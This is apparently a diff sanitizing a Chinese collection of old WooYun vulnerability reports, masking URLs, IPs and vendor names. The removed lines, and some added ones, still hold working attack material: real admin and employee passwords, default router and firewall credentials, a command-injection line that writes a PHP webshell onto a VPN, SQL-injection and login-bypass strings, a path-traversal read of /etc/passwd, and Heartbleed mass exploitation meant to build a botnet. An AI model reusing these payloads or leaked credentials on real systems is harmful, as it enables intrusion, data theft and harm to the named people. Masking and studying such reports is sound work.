 **POC**: (见原文)
 
@@ -15408,7 +15408,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: http://gtj.boluo.gov.cn/广东省惠州市博罗县国土资源局门户网站http://gtj.boluo.gov.cn/test.txt
+**详情**: https://example.com/[已脱敏]
 
 **POC**: (见原文)
 
@@ -15430,9 +15430,9 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: http://open.lianlianpay.com/   地址下的XXXXX支付文档PHP Demo文件。如：http://open.lianlianpay.com/wp-content/uploads/2014/08/web_DEMO-2015-07-24-092030.rar看lib里边的库文件。路径./lib/llpay_md5.function.php审计相关源码：/*** 签名字符串* @param $prestr 需要签名的字符串* @param $key 私钥* return 签名结果*/function md5Sign($prestr, $key) {$prestr = $prestr ."&key=". $key;file_put_contents("log.txt","签名原串:".$prestr."\n", FILE_APPEND);return md5($pre
+**详情**: https://example.com/[已脱敏]   地址下的XXXXX支付文档PHP Demo文件。如：https://example.com/[已脱敏] 签名字符串* @param $prestr 需要签名的字符串* @param $key 私钥* return 签名结果*/function md5Sign($prestr, $key) {$prestr = $prestr ."&key=". $key;file_put_contents("log.txt","签名原串:".$prestr."\n", FILE_APPEND);return md5($pre
 
-**POC**: 利用详情请参考：http://wooyun.org/bugs/wooyun-2010-0132264http://wooyun.org/bugs/wooyun-2010-0132567http://wooyun.org/bugs/wooyun-2010-0132961http://wooyun.org/bugs/wooyun-2010-0132964http://wooyun.org/bugs/wooyun-2010-0132969
+**POC**: 利用详情请参考：https://example.com/[已脱敏]
 
 **绕过**: 直接利用
 
@@ -15454,7 +15454,7 @@
 
 **详情**: 抓包：登陆界面：登陆后：
 
-**POC**: 登陆地址：http://mail.njnu.edu.cn用户：09059密码：tao371057
+**POC**: 登陆地址：https://example.com/[已脱敏]
 
 **绕过**: 直接利用
 
@@ -15476,7 +15476,7 @@
 
 **详情**: 航天四创a.sop cms V4.9及其以下4.X版本运行平台中存在很多密码是password的用户；
 
-**POC**: 用户名：test 密码：password在google中搜索 a.sop cms(V4可以搜索到不少登录后台：比如：国税总局http://202.108.90.173:7001/cmsweb/login.jsp登录进入：进入后，可以直接上传jsp脚本木马；有的可能没有test用户，这个也不要紧，还有比较有意思的；你可以尝试：用户名：1'or'1'='1密码：password应该也是可以登录的。
+**POC**: 用户名：test 密码：password在google中搜索 a.sop cms(V4可以搜索到不少登录后台：比如：国税总局http://[IP已脱敏]
 
 **绕过**: 直接利用
 
@@ -15496,9 +15496,9 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 第一财经好吧 先说列目录的：http://cbnxy.yicai.com/data/http://cbnxy.yicai.com/images/http://cdms2011.yicai.com/images/http://cdms2011.yicai.com/data/http://cfv.yicai.com/images/http://csr.yicai.com/images/http://cxcx.yicai.com/images/。。。其他栏目自测吧  太多了。。再说： 整站打包下载有备份数据库  有数据库连接。。ok  先这样
+**详情**: 第一财经好吧 先说列目录的：https://example.com/[已脱敏]  太多了。。再说： 整站打包下载有备份数据库  有数据库连接。。ok  先这样
 
-**POC**: 列目录的：http://cbnxy.yicai.com/data/http://cbnxy.yicai.com/images/http://cdms2011.yicai.com/images/http://cdms2011.yicai.com/data/http://cfv.yicai.com/images/http://csr.yicai.com/images/http://cxcx.yicai.com/images/。。。其他栏目自测吧  太多了。。再说： 整站打包下载有备份数据库  有数据库连接。。
+**POC**: 列目录的：https://example.com/[已脱敏]  太多了。。再说： 整站打包下载有备份数据库  有数据库连接。。
 
 **绕过**: 直接利用
 
@@ -15520,7 +15520,7 @@
 
 **详情**: 1, XFF SQL注射2,SVN泄漏代码3,nginx解析漏洞
 
-**POC**: 1,XFF注射361day.sohu.comGET / HTTP/1.1Cookie: xxxuser-agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0)X-Requested-With: XMLHttpRequestReferer: http://361day.sohu.com/Host: 361day.sohu.comConnection: Keep-aliveAccept-Encoding: gzip,deflatex-forwarded-for: 1'由于是insert into注射
+**POC**: 1,XFF注射361day.sohu.comGET / HTTP/1.1Cookie: xxxuser-agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0)X-Requested-With: XMLHttpRequestReferer: https://example.com/[已脱敏] 361day.sohu.comConnection: Keep-aliveAccept-Encoding: gzip,deflatex-forwarded-for: 1'由于是insert into注射
 
 **绕过**: 直接利用
 
@@ -15528,8 +15528,8 @@
 ---
 
 ---
-### [wooyun-2014-073640] 美团某服务器配置不当泄露大量员工信息
-**厂商**: 美团网 | **年份**: 2014 | **类型**: 任意文件遍历/下载
+### [wooyun-2014-073640] 某外卖平台某服务器配置不当泄露大量员工信息
+**厂商**: 某外卖平台网 | **年份**: 2014 | **类型**: 任意文件遍历/下载
 
 **元思考**: 触发信号: 功能测试
 
@@ -15540,7 +15540,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 美团内部论坛（bbs.sankuai.com）由于配置不当导致列目录，暴露了/data下的备份数据，可被下载。（最新一次检测发现列目录问题已修复，所以无法提供列目录截图）
+**详情**: 某外卖平台内部论坛（bbs.sankuai.com）由于配置不当导致列目录，暴露了/data下的备份数据，可被下载。（最新一次检测发现列目录问题已修复，所以无法提供列目录截图）
 
 **POC**: 备份数据库可被下载。将数据进行本地导入。部分帖子信息。member表（一万多员工数据）。脑补一下，如果继续测试的话，可以将这一万多邮箱名去重，再找接口进行fuzz。。危害不小
 
@@ -15562,9 +15562,9 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: http://resolve.chinanetcenter.com/receiveMail.py泄露数据库密码、邮箱密码
+**详情**: https://example.com/[已脱敏]
 
-**POC**: 泄露物理路径,用的lampp,可惜phpmyadmin无法访问view-source:http://resolve.chinanetcenter.com/select2.php
+**POC**: 泄露物理路径,用的lampp,可惜phpmyadmin无法访问view-source:https://example.com/[已脱敏]
 
 **绕过**: 直接利用
 
@@ -15584,7 +15584,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 在游荡新网某c段的时候，发现一个ip比较特别，目录是阅遍了的，本以为不是什么重要系统，但是，细看下去，才知道有多牛逼。首先是ip地址：http://121.14.4.144:8080经过翻遍目录，最后找到这个页面看到了吧，能够直接访问用户添加页面，那么，我们下面就开始查看管理密码吧密码处直接代码审查元素就能看到未加密的密码，坑爹吧。之后我们顺理成章的登陆了后台，看看这可怕的权限吧。。210052条用户记录，全部能够禁止前台登陆哦！！也就是控制登陆权限在阅遍的时候发现了一个压缩包，里面存放着网页的源文件，由此发现了数据库连接信息碉堡了有木有。。。之后在系统设置中也能够看到某新网邮箱，有心人利用能够进行社工造成进一步危害
+**详情**: 在游荡新网某c段的时候，发现一个ip比较特别，目录是阅遍了的，本以为不是什么重要系统，但是，细看下去，才知道有多牛逼。首先是ip地址：http://[IP已脱敏]经过翻遍目录，最后找到这个页面看到了吧，能够直接访问用户添加页面，那么，我们下面就开始查看管理密码吧密码处直接代码审查元素就能看到未加密的密码，坑爹吧。之后我们顺理成章的登陆了后台，看看这可怕的权限吧。。210052条用户记录，全部能够禁止前台登陆哦！！也就是控制登陆权限在阅遍的时候发现了一个压缩包，里面存放着网页的源文件，由此发现了数据库连接信息碉堡了有木有。。。之后在系统设置中也能够看到某新网邮箱，有心人利用能够进行社工造成进一步危害
 
 **POC**: (见原文)
 
@@ -15704,8 +15704,8 @@
 ---
 
 ---
-### [wooyun-2013-022850] 中国电信我的e家路由器远程拒绝服务攻击
-**厂商**: 中国电信 | **年份**: 2013 | **类型**: 默认配置不当
+### [wooyun-2013-022850] 某运营商我的e家路由器远程拒绝服务攻击
+**厂商**: 某运营商 | **年份**: 2013 | **类型**: 默认配置不当
 
 **元思考**: 触发信号: 认证接口
 
@@ -15716,7 +15716,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 中国电信我的e家路由器通过ADSL拨号，家庭网关可以获得一个互联网IP地址；但是此网关默认开启了远程80端口访问，也就是说可以通过互联网访问家庭网关，而互联网用户通过登录ip访问路由器能够输入帐号口令和进行设备注册。大家可以看到21.79可以正常访问，以下我我长ping，截图如下可以看到一直是通的，下面是见证奇迹的时刻，点击“设备注册”按钮会到如下图所示页面随便乱填入“逻辑ID”和“密码” 然后点击注册，OK，此时受害者已经掉网了。请中国电信设备采购负责人擦亮氪金狗眼，这种产品居然能给客户用？
+**详情**: 某运营商我的e家路由器通过ADSL拨号，家庭网关可以获得一个互联网IP地址；但是此网关默认开启了远程80端口访问，也就是说可以通过互联网访问家庭网关，而互联网用户通过登录ip访问路由器能够输入帐号口令和进行设备注册。大家可以看到21.79可以正常访问，以下我我长ping，截图如下可以看到一直是通的，下面是见证奇迹的时刻，点击“设备注册”按钮会到如下图所示页面随便乱填入“逻辑ID”和“密码” 然后点击注册，OK，此时受害者已经掉网了。请某运营商设备采购负责人擦亮氪金狗眼，这种产品居然能给客户用？
 
 **POC**: 如上
 
@@ -15727,7 +15727,7 @@
 
 ---
 ### [wooyun-2014-070851] 天翼手机在线服务中心tomcat导致沦陷漫游服务器
-**厂商**: 中国电信综合平台开发运营中心 | **年份**: 2014 | **类型**: 系统/服务运维配置不当
+**厂商**: 某运营商综合平台开发运营中心 | **年份**: 2014 | **类型**: 系统/服务运维配置不当
 
 **元思考**: 触发信号: 功能测试
 
@@ -15738,7 +15738,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: url:http://116.226.86.43:80/manager/htmluser:adminpass:admin
+**详情**: url:http://[IP已脱敏]
 
 **POC**: (见原文)
 
@@ -15784,7 +15784,7 @@
 
 **详情**: 不解释 直接管理模式空帐号空密码登录关键字远程用户界面(首页)
 
-**POC**: 不解释 直接管理模式空帐号空密码登录关键字远程用户界面(首页)给个测试地址http://223.72.168.219/其他型号也存在此问题
+**POC**: 不解释 直接管理模式空帐号空密码登录关键字远程用户界面(首页)给个测试地址http://[IP已脱敏]
 
 **绕过**: 直接利用
 
@@ -15804,9 +15804,9 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 中国人民共和国文化部艺术发展中心中国书画院：http://www.chinashy.com.cn/由于没有删除install，可导致重装。http://www.chinashy.com.cn/install/install.php
+**详情**: 中国人民共和国文化部艺术发展中心中国书画院：https://example.com/[已脱敏]
 
-**POC**: 中国人民共和国文化部艺术发展中心中国书画院：http://www.chinashy.com.cn/由于没有删除install，可导致重装。http://www.chinashy.com.cn/install/install.php
+**POC**: 中国人民共和国文化部艺术发展中心中国书画院：https://example.com/[已脱敏]
 
 **绕过**: 直接利用
 
@@ -15814,8 +15814,8 @@
 ---
 
 ---
-### [wooyun-2015-0107713] 中国电信某系统运维不当导致可发布活动和修改活动
-**厂商**: 中国电信 | **年份**: 2015 | **类型**: 系统/服务运维配置不当
+### [wooyun-2015-0107713] 某运营商某系统运维不当导致可发布活动和修改活动
+**厂商**: 某运营商 | **年份**: 2015 | **类型**: 系统/服务运维配置不当
 
 **元思考**: 触发信号: 后台管理
 
@@ -15826,7 +15826,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 主页地址http://eshare.189.cn/活动专区后台地址http://event.eshare.189.cn/index.php?m=index&a=logincyycyy123
+**详情**: 主页地址https://example.com/[已脱敏]
 
 **POC**: (见原文)
 
@@ -15848,7 +15848,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 1. 过程就简单掠过了....此IP居然开放了1521端口.....我勒个去http://180.153.142.34  访问确定厂商  车辆管理系统给一枚权限账号测试验证：atzc  密码：xgy123456782. 既然开放1521端口 那就直接猜解信息吧  数据库名默认：orcl密码直接sysdba权限登录  账号sys  密码：sys顺利拿下数据库3. 直接去管理员用户表 明文密码然后再来看看其他的表其中发现一张用户权限表和车台指令表... 可断油... 车控台复位 限速登陆账号验证：实时定位信息从车辆安装终端来看 将会有7100台汽车受影响最后来一张车辆定位的数据表 GPS坐标/里程数==信息 修改数据不要给租车费？
+**详情**: 1. 过程就简单掠过了....此IP居然开放了1521端口.....我勒个去http://[IP已脱敏]  访问确定厂商  车辆管理系统给一枚权限账号测试验证：atzc  密码：xgy123456782. 既然开放1521端口 那就直接猜解信息吧  数据库名默认：orcl密码直接sysdba权限登录  账号sys  密码：sys顺利拿下数据库3. 直接去管理员用户表 明文密码然后再来看看其他的表其中发现一张用户权限表和车台指令表... 可断油... 车控台复位 限速登陆账号验证：实时定位信息从车辆安装终端来看 将会有7100台汽车受影响最后来一张车辆定位的数据表 GPS坐标/里程数==信息 修改数据不要给租车费？
 
 **POC**: (见原文)
 
@@ -15924,8 +15924,8 @@
 ---
 
 ---
-### [wooyun-2014-049406] 中国电信路由器默认配置不当导致用户ADSL账号密码及物理位置泄露
-**厂商**: 中国电信 | **年份**: 2014 | **类型**: 默认配置不当
+### [wooyun-2014-049406] 某运营商路由器默认配置不当导致用户ADSL账号密码及物理位置泄露
+**厂商**: 某运营商 | **年份**: 2014 | **类型**: 默认配置不当
 
 **元思考**: 触发信号: 功能测试
 
@@ -15936,7 +15936,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 中国电信路由器默认配置不当导致用户ADSL账号密码及物理位置泄露
+**详情**: 某运营商路由器默认配置不当导致用户ADSL账号密码及物理位置泄露
 
 **POC**: 首先，我们先找到一个活跃的IP段，开启扫描，就会得到以下结果注意网页标题“F460”的地址，在浏览器打开这个IP地址要输入账号密码，怎么办？别着急，一般电信猫通用的账号密码就是telecomadmin 以及 nE7[马赛克]m 而且没有限制外网访问，猜测应该是故意留下的后门进去啦，但是怎么能查到详细的信息呢？发现电信对于网页表单value加密了，但是我懒得去找解密方法，按下F12，然后点击“修改”，明文密码就出现了根据电话号码的区号查询，这个电话属于广西南宁市电信，那么我们就打开广西电信的官网，按照我们得到的宽带密码登陆吧登陆成功以后，电话，手机，宽带信息就随便查了
 
@@ -15960,7 +15960,7 @@
 
 **详情**: opera软件 DNS域传送
 
-**POC**: opera.com.		3600	IN	SOA	nic1.opera.com. hostmaster.opera.com. 2015090200 3600 900 1209600 86400opera.com.		600	IN	A	82.145.215.49opera.com.		3600	IN	TXT	"v=spf1 ip4:213.236.208.184 ip4:91.203.97.254 ip4:213.236.208.188 ip4:185.26.183.133 ip4:185.26.183.134 ip4:185.26.183.135 ip4:185.26.183.145 ip6:2
+**POC**: opera.com.		3600	IN	SOA	nic1.opera.com. hostmaster.opera.com. 2015090200 3600 900 1209600 86400opera.com.		600	IN	A	[IP已脱敏]opera.com.		3600	IN	TXT	"v=spf1 ip4:[IP已脱敏] ip4:[IP已脱敏] ip4:[IP已脱敏] ip4:[IP已脱敏] ip4:[IP已脱敏] ip4:[IP已脱敏] ip4:[IP已脱敏] ip6:2
 
 **绕过**: 直接利用
 
@@ -16004,7 +16004,7 @@
 
 **详情**: 
 
-**POC**: http://women.sohu.com/xingzuo/Templates/recommend.php3?id=<?http://women.sohu.com/xingzuo/Templates/sendinfo.php3?id=<?<?$oraconn = OCILogon("women","women","women");if ($oraconn <= 0){echo  "<META HTTP-EQUIV=\"REFRESH\" CONTENT=\"0; URL=errlogin.html\">";OCILogOff($oraconn);exit;}if(isset($id) and 
+**POC**: https://example.com/[已脱敏] = OCILogon("women","women","women");if ($oraconn <= 0){echo  "<META HTTP-EQUIV=\"REFRESH\" CONTENT=\"0; URL=errlogin.html\">";OCILogOff($oraconn);exit;}if(isset($id) and 
 
 **绕过**: 直接利用
 
@@ -16024,7 +16024,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 深信服ssl vpn远程代码执行漏洞(1):参考WooYun: 深信服ssl vpn远程代码执行漏洞http://vpn.oppo.com:1000/cgi-bin/php-cgi/html/redirect.php?-s...深信服ssl vpn远程代码执行漏洞(2):参考WooYun: 深信服ssl vpn远程代码执行漏洞直接写入一句话：http://vpn.oppo.com:1000/cgi-bin/php-cgi/html/daemon/tsproxy.php?cmd=ifconfig||echo%20'%3C?php%20eval($_POST[cmd]);?%3E'%20%3E/app/usr/sbin/webui/html/svpn.php赋予权限：http://vpn.oppo.com:1000/cgi-bin/php-cgi/html/daemon/tsproxy.php
+**详情**: 深信服ssl vpn远程代码执行漏洞(1):参考WooYun: 深信服ssl vpn远程代码执行漏洞https://example.com/[已脱敏] vpn远程代码执行漏洞(2):参考WooYun: 深信服ssl vpn远程代码执行漏洞直接写入一句话：https://example.com/[已脱敏]'%3C?php%20eval($_POST[cmd]);?%3E'%20%3E/app/usr/sbin/webui/html/svpn.php赋予权限：https://example.com/[已脱敏]
 
 **POC**: 如上所述！
 
@@ -16068,7 +16068,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 后台沦陷http://beta.yunshanmeicai.com/   直接fuzz171	fujinpeng@yunshanmeicai.com	meicai123	302	false	false	314199	zhengxiaodong@yunshanmeicai.com	meicai123	302	false	false	31436	gangchunhua@yunshanmeicai.com	meicai123	302	false	false	31742	jinhuainan@yunshanmeicai.com	meicai123	302	false	false	31746	yaolongyin@yunshanmeicai.com	meicai123	302	false	false	31767	yaodanxu@yunshanmeicai.com	meicai123	302	fal
+**详情**: 后台沦陷https://example.com/[已脱敏]   直接fuzz171	fujinpeng@yunshanmeicai.com	meicai123	302	false	false	314199	zhengxiaodong@yunshanmeicai.com	meicai123	302	false	false	31436	gangchunhua@yunshanmeicai.com	meicai123	302	false	false	31742	jinhuainan@yunshanmeicai.com	meicai123	302	false	false	31746	yaolongyin@yunshanmeicai.com	meicai123	302	false	false	31767	yaodanxu@yunshanmeicai.com	meicai123	302	fal
 
 **POC**: ···
 
@@ -16090,7 +16090,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: http://wooyun.org/bugs/wooyun-2015-0128066  看了这个我就想去再看看ip还能访问再看了看洞主的截图  这打码技术有点高看了这图 我就估计是同一个密码  就直接进去了
+**详情**: https://example.com/[已脱敏]  看了这个我就想去再看看ip还能访问再看了看洞主的截图  这打码技术有点高看了这图 我就估计是同一个密码  就直接进去了
 
 **POC**: (见原文)
 
@@ -16112,9 +16112,9 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 0x01:配置不当http://www.yaolan.com/topic/topic.7z
+**详情**: 0x01:配置不当https://example.com/[已脱敏]
 
-**POC**: 配置不当http://www.yaolan.com/topic/topic.7z
+**POC**: 配置不当https://example.com/[已脱敏]
 
 **绕过**: 直接利用
 
@@ -16166,8 +16166,8 @@
 ---
 
 ---
-### [wooyun-2011-02281] 百度分站在线编辑器......
-**厂商**: 百度 | **年份**: 2011 | **类型**: 系统/服务运维配置不当
+### [wooyun-2011-02281] 某搜索引擎分站在线编辑器......
+**厂商**: 某搜索引擎 | **年份**: 2011 | **类型**: 系统/服务运维配置不当
 
 **元思考**: 触发信号: 功能测试
 
@@ -16178,9 +16178,9 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: http://blog.sem.baidu.com/FCK/editor/filemanager/browser/default/connectors/test.html#
+**详情**: https://example.com/[已脱敏]
 
-**POC**: http://blog.sem.baidu.com/FCK/editor/filemanager/browser/default/connectors/test.html#
+**POC**: https://example.com/[已脱敏]
 
 **绕过**: 直接利用
 
@@ -16224,7 +16224,7 @@
 
 **详情**: 配置不当导致的
 
-**POC**: http://daj.xh.sh.cn:8082/web-console/shell.jsp
+**POC**: https://example.com/[已脱敏]
 
 **绕过**: 直接利用
 
@@ -16244,7 +16244,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 我勒个去~~~~~有些我还看不懂呢~~~~相当淫荡啊！！！①目录历遍历遍地址①：http://www.zzairport.com/images/没多大用处………………历遍地址②：http://www.zzairport.com/backup/源码包……②源码包【够刺激吧，还有两个版本的】我很猥琐~~~~~~~所以我打开代码包看了……………………③网站配置信息~~~~~~我继续找 ………………找啊找~~找啊找~~~在admin_in中找到了config.php文件，嘿嘿数据库的帐号密码都在了！！！④数据库~~~额，服务器上的数据库没有去连接过~~~光在文件夹就找到了几个备份文件⑤代码审计
+**详情**: 我勒个去~~~~~有些我还看不懂呢~~~~相当淫荡啊！！！①目录历遍历遍地址①：https://example.com/[已脱敏] ………………找啊找~~找啊找~~~在admin_in中找到了config.php文件，嘿嘿数据库的帐号密码都在了！！！④数据库~~~额，服务器上的数据库没有去连接过~~~光在文件夹就找到了几个备份文件⑤代码审计
 
 **POC**: 上面都讲了   等我有新发现   我再发第二炮！！！
 
@@ -16288,9 +16288,9 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 百度 收索关键词 四川机构网CMS网站后台管理系统手工测试前两页（只测试是否能登陆）包括但不限于以下地方政府网站http://www.wcfy.gov.cn/scjg/manage_login.asp admin scjg888  汶川县人民法院http://www.ycyx.gov.cn/scjg/manage_login.asp admin scjg888  岳池县酉溪镇人民政府http://www.gyjjjyzx.com/scjg/manage_login.asp  admin scjg888  广元紧急救援中心http://www.lzquansheng.com/scjg/Admin_Index.asp  admin scjg888   乐至县全胜乡人民政府http://www.scsdds.com/scjg/Manage_Login.asp    admin scjg888  
+**详情**: 某搜索引擎 收索关键词 四川机构网CMS网站后台管理系统手工测试前两页（只测试是否能登陆）包括但不限于以下地方政府网站https://example.com/[已脱敏] admin scjg888  汶川县人民法院https://example.com/[已脱敏] admin scjg888  岳池县酉溪镇人民政府https://example.com/[已脱敏]  admin scjg888  广元紧急救援中心https://example.com/[已脱敏]  admin scjg888   乐至县全胜乡人民政府https://example.com/[已脱敏]    admin scjg888  
 
-**POC**: 仅上传一个图片证明可以登录百度为您找到相关结果约848,000个
+**POC**: 仅上传一个图片证明可以登录某搜索引擎为您找到相关结果约848,000个
 
 **绕过**: 直接利用
 
@@ -16310,9 +16310,9 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 1.url：http://www.cnyes.com/
+**详情**: 1.url：https://example.com/[已脱敏]
 
-**POC**: 2.泄露信息：; <<>> DiG 9.8.3-P1 <<>> @ldap.cnyes.com. axfr cnyes.com; (1 server found);; global options: +cmdcnyes.com.		3600	IN	SOA	ldap.cnyes.com. admin.cnyes.com. 748 900 600 86400 3600cnyes.com.		3600	IN	A	211.72.252.30cnyes.com.		3600	IN	NS	ldap.cnyes.com.cnyes.com.		3600	IN	NS	ns.cnyes.com.cnyes.co
+**POC**: 2.泄露信息：; <<>> DiG 9.8.3-P1 <<>> @ldap.cnyes.com. axfr cnyes.com; (1 server found);; global options: +cmdcnyes.com.		3600	IN	SOA	ldap.cnyes.com. admin.cnyes.com. 748 900 600 86400 3600cnyes.com.		3600	IN	A	[IP已脱敏]cnyes.com.		3600	IN	NS	ldap.cnyes.com.cnyes.com.		3600	IN	NS	ns.cnyes.com.cnyes.co
 
 **绕过**: 直接利用
 
@@ -16332,9 +16332,9 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: “Heartbleed”的漏洞，过去快5个月了，各大安全厂商都说自己的设备已经修复，你们真的修复了吗？乌云上也后好多大牛提交过这类漏洞，但都是个别设备“Heartbleed”的漏洞。由于数量有限，不能形成强有利的威胁。今天“灰狼哥”带你一起对天融信136台安全设备进行“心跳”利用，获取admin权限、组建僵尸网络。好了，下面利用开始，对136台天融信设备进行批量“心跳”利用。（一）首先列举NGFW4000(TG-4508-CU)型号设备。https://183.234.20.148/ （账号密码superman：talent）登陆设备，管理员权限。再来，https://218.91.210.30再登陆https://61.158.253.204（账号密码superman：talent）（二）在列举NGFW4000(NGFW4000(TG-21109))型号设备。再来，https://120
+**详情**: “Heartbleed”的漏洞，过去快5个月了，各大安全厂商都说自己的设备已经修复，你们真的修复了吗？乌云上也后好多大牛提交过这类漏洞，但都是个别设备“Heartbleed”的漏洞。由于数量有限，不能形成强有利的威胁。今天“灰狼哥”带你一起对天融信136台安全设备进行“心跳”利用，获取admin权限、组建僵尸网络。好了，下面利用开始，对136台天融信设备进行批量“心跳”利用。（一）首先列举NGFW4000(TG-4508-CU)型号设备。https://[IP已脱敏] （账号密码superman：talent）登陆设备，管理员权限。再来，https://[IP已脱敏]再登陆https://[IP已脱敏]（账号密码superman：talent）（二）在列举NGFW4000(NGFW4000(TG-21109))型号设备。再来，https://120
 
-**POC**: （一）首先列举NGFW4000(TG-4508-CU)型号设备。https://183.234.20.148/ （账号密码superman：talent）登陆设备，管理员权限。再来，https://218.91.210.30再登陆https://61.158.253.204（账号密码superman：talent）（二）在列举NGFW4000(NGFW4000(TG-21109))型号设备。利用过程同上，https://120.199.19.122/（账号密码superman：talent）（三）在列举NGFW4000(NGFW4000(TG-11406-VPN))型号设备。https://2
+**POC**: （一）首先列举NGFW4000(TG-4508-CU)型号设备。https://[IP已脱敏] （账号密码superman：talent）登陆设备，管理员权限。再来，https://[IP已脱敏]再登陆https://[IP已脱敏]（账号密码superman：talent）（二）在列举NGFW4000(NGFW4000(TG-21109))型号设备。利用过程同上，https://[IP已脱敏]
 
 **绕过**: 直接利用
 
@@ -16356,7 +16356,7 @@
 
 **详情**: 飞华网任意文件遍历下载 其实这是一个resin配置不当导致的漏洞，老问题就不多说了
 
-**POC**: http://scms.feihua.com:8088/resin-doc/images/http://scms.feihua.com:8088/resin-doc/viewfile/?contextpath=/&servletpath=&file=WEB-INF/web.xml读取服务器密码：http://scms.feihua.com:8088/resin-doc/resource/tutorial/jndi-appconfig/test?inputFile=/etc/passwdhttp://scms.feihua.com:8088/resin-doc/resource/tutorial
+**POC**: https://example.com/[已脱敏]
 
 **绕过**: 直接利用
 
@@ -16376,7 +16376,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: http://www.epicc.com.cn/ecenter/views/ecenterClub/loginRegisterNew/login.jsp思路我慢慢来说我先随便重置一个，如admin他是1个查询用户的原理，如果用户存在，那么就会显示看看代码：</div><div class="account"><p>账号<label style="font-size:12px;color:gray;">(用户名/已验证邮箱/已验证手机号)</label></p><input type="text"  class="name" tabindex="1" value="用户名/已验证邮箱/已验证手机号" maxlength="60"  id="entryId" name="entryId" onfocus="if(this.value=='用户名/已验证邮箱/已验证手机号') this.valu
+**详情**: https://example.com/[已脱敏] class="account"><p>账号<label style="font-size:12px;color:gray;">(用户名/已验证邮箱/已验证手机号)</label></p><input type="text"  class="name" tabindex="1" value="用户名/已验证邮箱/已验证手机号" maxlength="60"  id="entryId" name="entryId" onfocus="if(this.value=='用户名/已验证邮箱/已验证手机号') this.valu
 
 **POC**: (见原文)
 
@@ -16398,9 +16398,9 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 具体请参考：http://sebug.net/vuldb/ssvid-20898
+**详情**: 具体请参考：https://example.com/[已脱敏]
 
-**POC**: http://www.xp.com/static/images/pic1.png%00.php
+**POC**: https://example.com/[已脱敏]
 
 **绕过**: 直接利用
 
@@ -16430,7 +16430,7 @@
 ---
 
 ---
-### [wooyun-2015-086667] 深圳宜停车APP的停车信息可遍历并且可以重放攻击
+### [wooyun-2015-086667] 深圳宜某停车平台APP的某停车平台信息可遍历并且可以重放攻击
 **厂商**: szrtc.cn | **年份**: 2015 | **类型**: 应用配置错误
 
 **元思考**: 触发信号: 功能测试
@@ -16442,9 +16442,9 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 1、宜停车APP发行时未进行代码混淆，导致能够查看部分代码和URL信息；2、发行时，未将部分调试信息禁用，导致APP在运行时能够显示其访问信息。且该URL可以重放攻击；while (true){return;String str1 = this.d.getText().toString();String str2 = this.e.getText().toString();if (str2.equals("&&%%$$&&&&"));for (this.f = this.h.d(); ; this.f = h.b(str2)){this.g = str1;i.a("https://218.17.99.52:1322/Index.aspx?versontype=1&t=member&method=login&mobileno=" + str1 + "&pwd=" + this.f + "&o
+**详情**: 1、宜某停车平台APP发行时未进行代码混淆，导致能够查看部分代码和URL信息；2、发行时，未将部分调试信息禁用，导致APP在运行时能够显示其访问信息。且该URL可以重放攻击；while (true){return;String str1 = this.d.getText().toString();String str2 = this.e.getText().toString();if (str2.equals("&&%%$$&&&&"));for (this.f = this.h.d(); ; this.f = h.b(str2)){this.g = str1;i.a("https://[IP已脱敏] + str1 + "&pwd=" + this.f + "&o
 
-**POC**: https://218.17.99.52:1322/Index.aspx?versontype=1&t=transaction&method=getorderlist&parkuserid=100144321&appkey=106300944&security=8cd3c505b60b03b06f7377e60418b4e2&mobilecode=921293977819105&timestamp=20141210151402&sign=6373e9be127205d5126fe13ded996793
+**POC**: https://[IP已脱敏]
 
 **绕过**: 直接利用
 
@@ -16464,9 +16464,9 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 地址：http://www.century21.com.tw/index.aspx?fn=index2首页：泄露指向：; <<>> DiG 9.8.3-P1 <<>> @pdns1.pchome.com.tw. axfr century21.com.tw; (1 server found);; global options: +cmdcentury21.com.tw.	3600	IN	SOA	localhost\@. hostmaster.century21.com.tw. 2015 10800 3600 604800 3600century21.com.tw.	3600	IN	MX	1 aspmx.l.google.com.century21.com.tw.	3600	IN	MX	5 alt1.aspmx.l.google.com.century21.com.tw.	3600	IN	MX
+**详情**: 地址：https://example.com/[已脱敏] <<>> DiG 9.8.3-P1 <<>> @pdns1.pchome.com.tw. axfr century21.com.tw; (1 server found);; global options: +cmdcentury21.com.tw.	3600	IN	SOA	localhost\@. hostmaster.century21.com.tw. 2015 10800 3600 604800 3600century21.com.tw.	3600	IN	MX	1 aspmx.l.google.com.century21.com.tw.	3600	IN	MX	5 alt1.aspmx.l.google.com.century21.com.tw.	3600	IN	MX
 
